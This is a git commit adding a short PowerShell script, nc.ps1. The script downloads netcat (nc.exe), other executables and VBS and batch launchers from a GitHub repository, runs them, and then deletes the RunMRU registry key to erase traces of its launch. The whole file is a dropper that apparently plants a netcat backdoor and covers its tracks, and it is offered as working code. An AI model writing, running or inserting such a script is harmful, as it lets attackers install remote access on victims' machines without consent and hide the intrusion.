7e824293904bb134458560d649441f3171aed5b3
7ext 34 <55564552+7ext34@users.noreply.github.com>
2019-10-01 18:48:31 -0400

    Create nc.ps1

---
+++ nc.ps1
@@ -0,0 +1,10 @@
+cmd /c "md C:\temp"
+(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/nc.vbs","C:\nc\nc.vbs")
+(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/nc.bat","C:\nc\nc.bat")
+(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/nc.exe","C:\nc\nc.exe")
+(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/nc_run.bat","C:\nc\nc_run.bat")
+(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/rh.exe","C:\nc\rh.exe")
+(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/voice.exe","C:\nc\voice.exe")
+Start-Process -FilePath C:\nc\nc.vbs
+
+cmd /c "reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va  /f"
